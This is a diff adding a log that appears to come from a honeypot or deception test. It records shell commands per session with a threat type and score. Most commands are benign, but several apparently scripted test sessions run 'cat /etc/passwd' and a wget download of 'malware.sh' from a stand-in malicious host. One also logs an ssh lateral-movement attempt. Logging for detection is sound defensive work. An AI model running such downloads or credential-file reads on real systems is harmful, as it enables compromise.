@@ -1,0 +1,79 @@
+[2026-07-08 19:06:03] [INFO] IP=127.0.0.1 | SESSION=674f4860-dfac-4987-a399-6f0b4d4cf436 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-08 19:06:05] [INFO] IP=127.0.0.1 | SESSION=674f4860-dfac-4987-a399-6f0b4d4cf436 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-08 19:07:35] [INFO] IP=127.0.0.1 | SESSION=ce41454c-7383-475c-8102-376513934a6f | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-08 19:12:22] [INFO] IP=127.0.0.1 | SESSION=5f49ae0e-b94d-4044-a2e1-831db4a01bce | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:33:22] [INFO] IP=127.0.0.1 | SESSION=b9e656dc-54d0-44fb-92d1-65d33fa5c432 | TYPE=Directory Navigation | SCORE=10 | CMD=cd
+[2026-07-17 11:34:15] [INFO] IP=127.0.0.1 | SESSION=edeaa5c5-b23c-4537-8267-4c864a97c807 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 11:37:38] [INFO] IP=127.0.0.1 | SESSION=e8d66ca1-cb16-4cbf-aabf-ae36d3e220f4 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:37:40] [INFO] IP=127.0.0.1 | SESSION=e8d66ca1-cb16-4cbf-aabf-ae36d3e220f4 | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 11:49:35] [INFO] IP=127.0.0.1 | SESSION=3aff9d2e-84e4-4d78-bad4-515329c9bfd1 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:49:37] [INFO] IP=127.0.0.1 | SESSION=3aff9d2e-84e4-4d78-bad4-515329c9bfd1 | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 11:51:27] [INFO] IP=127.0.0.1 | SESSION=70fa7cc6-20be-4d23-a87f-296c947aca05 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:51:29] [INFO] IP=127.0.0.1 | SESSION=70fa7cc6-20be-4d23-a87f-296c947aca05 | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 11:52:55] [INFO] IP=127.0.0.1 | SESSION=27457078-c730-4edc-9726-7ff6b1b0c2c3 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:54:35] [INFO] IP=127.0.0.1 | SESSION=44f9db03-2b64-4960-8327-15e7ab1d0ef3 | TYPE=Unknown | SCORE=5 | CMD=top
+exit
+[2026-07-17 11:54:52] [INFO] IP=127.0.0.1 | SESSION=c7807336-8c46-4dbc-aabb-4e1a8b911aba | TYPE=Unknown | SCORE=5 | CMD=top
+exit
+[2026-07-17 11:55:16] [INFO] IP=127.0.0.1 | SESSION=aebd2440-3a84-42d7-8d71-bebf4b0fa77c | TYPE=Unknown | SCORE=5 | CMD=top
+exit
+[2026-07-17 11:55:43] [INFO] IP=127.0.0.1 | SESSION=b3045733-3075-48de-91d6-e4f7bd41e88d | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 11:55:45] [INFO] IP=127.0.0.1 | SESSION=b3045733-3075-48de-91d6-e4f7bd41e88d | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 12:01:24] [INFO] IP=127.0.0.1 | SESSION=e3f07d0e-e898-45a4-a991-34681e30d256 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 12:08:18] [INFO] IP=127.0.0.1 | SESSION=65905d3c-40bd-4b35-b11b-2f3d46c956e5 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 12:08:22] [INFO] IP=127.0.0.1 | SESSION=3a1b9e5c-a3a7-4c68-9bf9-b7e72667336e | TYPE=Unknown | SCORE=5 | CMD=ls -a
+[2026-07-17 12:08:27] [INFO] IP=127.0.0.1 | SESSION=2fc87e40-c116-4205-800b-e2988ff14fbe | TYPE=Unknown | SCORE=5 | CMD=ls -la
+[2026-07-17 12:08:30] [INFO] IP=127.0.0.1 | SESSION=c3be015d-b35e-4cde-b08a-d1f5840a5c33 | TYPE=Unknown | SCORE=5 | CMD=ls -l
+[2026-07-17 13:23:42] [INFO] IP=127.0.0.1 | SESSION=cb740bb3-d543-436d-9395-011124ff68a5 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 13:37:40] [INFO] IP=127.0.0.1 | SESSION=dc515675-e74f-4ec9-928f-9d1cdb3645c3 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 13:37:42] [INFO] IP=127.0.0.1 | SESSION=dc515675-e74f-4ec9-928f-9d1cdb3645c3 | TYPE=Unknown | SCORE=5 | CMD=ls -a
+[2026-07-17 13:37:44] [INFO] IP=127.0.0.1 | SESSION=dc515675-e74f-4ec9-928f-9d1cdb3645c3 | TYPE=Unknown | SCORE=5 | CMD=cat company_directory/employees.csv
+[2026-07-17 17:17:33] [INFO] IP=127.0.0.1 | SESSION=eb40e63c-7d31-4dd8-9cc6-bfcec43ffc44 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-17 17:26:21] [INFO] IP=127.0.0.1 | SESSION=27daefd8-cff4-4262-bf42-f289652dc917 | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 17:26:42] [INFO] IP=127.0.0.1 | SESSION=27daefd8-cff4-4262-bf42-f289652dc917 | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 17:27:14] [INFO] IP=127.0.0.1 | SESSION=593f3b77-a633-4582-9d4f-df348ca059ce | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-17 17:27:16] [INFO] IP=127.0.0.1 | SESSION=593f3b77-a633-4582-9d4f-df348ca059ce | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-17 17:31:10] [INFO] IP=127.0.0.1 | SESSION=b7ce9e8b-e4a7-4701-bdf1-eff3a9ee0e84 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-23 17:05:06] [INFO] IP=127.0.0.1 | SESSION=df9005a7-fbe5-4470-8ac5-9f54f35cd4bb | TYPE=Unknown | SCORE=5 | CMD=top
+[2026-07-23 17:05:08] [INFO] IP=127.0.0.1 | SESSION=df9005a7-fbe5-4470-8ac5-9f54f35cd4bb | TYPE=Unknown | SCORE=5 | CMD=crontab -e
+[2026-07-27 16:37:06] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:37:07] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 16:37:08] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Unknown | SCORE=5 | CMD=ls -la
+[2026-07-27 16:37:08] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
+[2026-07-27 16:37:09] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
+[2026-07-27 16:37:10] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
+[2026-07-27 16:37:11] [INFO] IP=127.0.0.1 | SESSION=33617523-f0d0-4ed3-81ab-cdc6f5b49cb6 | TYPE=Malware Download | SCORE=90 | CMD=wget http://malicious-site.com/malware.sh
+[2026-07-27 16:37:48] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:37:49] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 16:37:49] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Unknown | SCORE=5 | CMD=ls -la
+[2026-07-27 16:37:50] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
+[2026-07-27 16:37:51] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
+[2026-07-27 16:37:52] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
+[2026-07-27 16:37:53] [INFO] IP=127.0.0.1 | SESSION=c0077ece-82ce-4855-98db-f33308752287 | TYPE=Malware Download | SCORE=90 | CMD=wget http://malicious-site.com/malware.sh
+[2026-07-27 16:38:13] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:38:14] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 16:38:15] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Unknown | SCORE=5 | CMD=ls -la
+[2026-07-27 16:38:15] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Unknown | SCORE=5 | CMD=mkdir test_deception
+[2026-07-27 16:38:16] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Directory Navigation | SCORE=10 | CMD=cd test_deception
+[2026-07-27 16:38:17] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Credential Enumeration | SCORE=60 | CMD=cat /etc/passwd
+[2026-07-27 16:38:18] [INFO] IP=127.0.0.1 | SESSION=94bbc2fb-6670-4b4e-a785-69d4e2a048d7 | TYPE=Malware Download | SCORE=90 | CMD=wget http://malicious-site.com/malware.sh
+[2026-07-27 16:40:04] [INFO] IP=127.0.0.1 | SESSION=24711ba6-4b12-41c8-bdfe-4ed3f75c66d7 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 16:43:28] [INFO] IP=127.0.0.1 | SESSION=183d92c9-be38-4298-96c7-79b9b3adc422 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 16:43:59] [INFO] IP=127.0.0.1 | SESSION=183d92c9-be38-4298-96c7-79b9b3adc422 | TYPE=Privilege Escalation | SCORE=95 | CMD=chmod
+[2026-07-27 16:47:57] [INFO] IP=127.0.0.1 | SESSION=144f8df2-55a4-45a4-af43-cfe6efc7ce87 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:48:17] [INFO] IP=127.0.0.1 | SESSION=144f8df2-55a4-45a4-af43-cfe6efc7ce87 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:50:33] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 16:50:38] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:50:39] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 16:50:48] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Directory Navigation | SCORE=10 | CMD=cd Downloads
+[2026-07-27 16:50:50] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 16:51:33] [INFO] IP=127.0.0.1 | SESSION=901af7ab-8778-48f8-ac95-1e8bc6fad418 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 16:57:12] [INFO] IP=127.0.0.1 | SESSION=24f671b5-7983-4c16-bc0f-800bb7cda658 | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 16:57:17] [INFO] IP=127.0.0.1 | SESSION=24f671b5-7983-4c16-bc0f-800bb7cda658 | TYPE=Reconnaissance | SCORE=20 | CMD=whoami
+[2026-07-27 16:59:10] [INFO] IP=127.0.0.1 | SESSION=24f671b5-7983-4c16-bc0f-800bb7cda658 | TYPE=Lateral Movement | SCORE=80 | CMD=ssh admin@192.168.1.50
+[2026-07-27 17:00:00] [INFO] IP=127.0.0.1 | SESSION=24f671b5-7983-4c16-bc0f-800bb7cda658 | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 17:10:39] [INFO] IP=127.0.0.1 | SESSION=712c9f9c-33ab-439f-8780-417a41f65b4e | TYPE=Reconnaissance | SCORE=20 | CMD=pwd
+[2026-07-27 17:10:40] [INFO] IP=127.0.0.1 | SESSION=712c9f9c-33ab-439f-8780-417a41f65b4e | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 17:10:51] [INFO] IP=127.0.0.1 | SESSION=712c9f9c-33ab-439f-8780-417a41f65b4e | TYPE=Directory Navigation | SCORE=10 | CMD=cd Downloads
+[2026-07-27 17:10:53] [INFO] IP=127.0.0.1 | SESSION=712c9f9c-33ab-439f-8780-417a41f65b4e | TYPE=Reconnaissance | SCORE=20 | CMD=ls
+[2026-07-27 17:11:06] [INFO] IP=127.0.0.1 | SESSION=712c9f9c-33ab-439f-8780-417a41f65b4e | TYPE=Unknown | SCORE=5 | CMD=cat ubuntu_server_notes.pdf
